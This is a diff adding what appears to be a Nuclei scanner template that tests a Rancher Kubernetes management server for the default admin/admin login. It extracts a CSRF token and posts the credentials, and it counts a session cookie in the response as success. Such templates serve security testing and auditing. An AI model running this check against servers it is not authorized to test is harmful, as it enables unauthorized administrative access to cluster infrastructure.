@@ -1,0 +1,52 @@
+id: rancher-default-login
+
+info:
+  name: Rancher Default Login
+  author: princechaddha
+  severity: high
+  description: Rancher is a open-source multi-cluster orchestration platform, lets operations teams deploy, manage and secure enterprise Kubernetes.
+  reference: https://github.com/rancher/rancher
+  tags: default-login,rancher,kubernetes,devops,cloud
+
+requests:
+  - raw:
+      - |
+        GET /v3/settings/first-login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
+
+      - |
+        POST /v3-public/localProviders/local?action=login HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: CSRF={{csrf}}
+        X-Api-Csrf: {{csrf}}
+        Connection: close
+        Content-Length: 136
+
+        {"username":"{{username}}","password":"{{password}}","description":"UI Session","responseType":"cookie","labels":{"ui-session":"true"}}
+
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+    attack: pitchfork
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - 'R_SESS=token'
+        part: header
+
+    extractors:
+      - type: regex
+        name: csrf
+        group: 1
+        internal: true
+        part: header
+        regex:
+          - 'Set-Cookie: CSRF=([a-z0-9]+)'
